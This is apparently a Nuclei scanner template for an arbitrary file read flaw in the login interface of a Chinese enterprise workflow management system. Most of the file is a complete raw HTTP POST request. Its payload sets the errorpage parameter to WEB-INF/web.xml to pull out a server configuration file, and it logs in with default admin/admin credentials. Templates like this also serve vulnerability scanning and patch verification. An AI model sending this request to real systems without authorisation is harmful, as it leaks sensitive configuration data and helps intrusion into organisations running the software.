id: shikong-zhiyou-file-read

info:
  name: "时空智友企业流程化管控系统 login 接口任意文件读取"
  author: 0dayPoc
  severity: medium
  description: |-
    时空智友企业流程化管控系统在 login 接口处理逻辑中存在文件路径验证缺陷。
      攻击者可通过构造恶意请求读取任意文件内容，导致敏感信息泄露。
  tags: 时空智友企业流程化管控系统

http:
- raw:
  - |
    POST /login HTTP/1.1
    Host: {{Hostname}}
    Cache-Control: max-age=0
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Cookie: JSESSIONID=2FA8E20E8AD7DA8D9E894C85B1305755; __qypid=""
    Content-Type: application/x-www-form-urlencoded
    Connection: close

    op=verify%7Clogin&targetpage=&errorpage=WEB-INF/web.xml&mark=&tzo=480&username=admin&password=admin
  matchers-condition: and
  matchers:
  - type: status
    status: [200]
  - type: word
    part: body
    words:
    - 'welcome'
